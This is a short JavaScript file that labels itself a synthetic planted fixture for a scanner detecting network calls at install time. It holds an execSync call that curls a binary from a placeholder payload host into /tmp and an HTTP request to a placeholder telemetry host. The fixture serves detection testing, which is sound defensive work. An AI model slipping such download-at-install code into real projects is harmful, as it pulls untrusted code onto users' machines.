// PLANTED negative-control fixture (T2 / JavaScript network-at-install).
// Synthetic. Never executed by R1 — pattern-matching evidence only.
const https = require("https")
const { execSync } = require("child_process")

async function fetchPayload(url) {
  const res = await fetch(url)
  return res.arrayBuffer()
}

execSync("curl -sSL https://payload.example.com/agent.bin -o /tmp/agent.bin")
https.get("http://metrics.example.com/telemetry", () => {})
